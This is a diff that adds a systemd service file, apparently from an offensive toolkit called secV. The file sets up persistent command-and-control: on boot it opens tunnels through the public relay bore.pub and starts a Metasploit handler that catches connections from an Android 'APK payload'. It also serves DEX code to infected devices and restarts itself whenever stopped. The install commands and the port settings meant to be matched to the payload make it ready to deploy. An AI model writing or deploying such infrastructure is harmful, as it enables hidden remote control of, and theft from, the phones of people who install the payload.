@@ -1,0 +1,34 @@
+# /etc/systemd/system/secv-c2.service
+# secV C2 persistence — auto-starts bore tunnels and MSF handler on boot.
+# Install: sudo cp secv-c2.service /etc/systemd/system/
+#          sudo systemctl enable secv-c2
+#          sudo systemctl start secv-c2
+#
+# Customize BORE_DEX_PORT, BORE_MSF_PORT, MSF_LPORT to match your APK payload.
+
+[Unit]
+Description=secV C2 — bore WAN tunnels + MSF handler
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=forking
+User=%i
+Environment="BORE_BIN=/usr/local/bin/bore"
+Environment="BORE_SERVER=bore.pub"
+Environment="BORE_DEX_PORT=21062"
+Environment="BORE_MSF_PORT=37993"
+Environment="DEX_HTTP_PORT=8080"
+Environment="MSF_LPORT=4444"
+Environment="DEX_SERVE_DIR=/opt/secv/dex"
+Environment="LOG_DIR=/var/log/secv"
+
+ExecStartPre=/bin/mkdir -p ${LOG_DIR}
+ExecStart=/opt/secv/c2_watchdog.sh
+ExecStop=/bin/kill -TERM $MAINPID
+Restart=always
+RestartSec=10
+KillMode=process
+
+[Install]
+WantedBy=multi-user.target
